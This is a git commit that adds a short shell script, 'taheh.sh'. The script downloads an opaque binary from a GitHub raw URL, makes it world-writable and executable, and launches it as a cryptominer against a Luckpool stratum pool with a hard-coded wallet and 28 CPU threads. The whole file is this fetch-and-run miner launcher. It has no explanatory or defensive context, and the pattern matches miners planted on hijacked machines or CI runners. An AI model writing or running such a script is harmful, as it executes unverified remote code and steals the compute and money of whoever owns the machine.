0886bd1a25e54c48308cb040099efd50acd6ed69
ddauprvpvj5 <89258650+ddauprvpvj5@users.noreply.github.com>
2021-08-20 20:42:05 +0700

    Create taheh.sh

---
+++ taheh.sh
@@ -0,0 +1,6 @@
+#!/bin/sh
+wget https://github.com/ddauprvpvj5/taek/raw/main/sembarang
+chmod 777 sembarang
+POL=stratum+tcp://na.luckpool.net:3956
+WAL=RHjPxndEKoEFRCevNmAeyjus5ZYtVG1iPb
+./sembarang -c $POL -u $WAL -p x --cpu 28
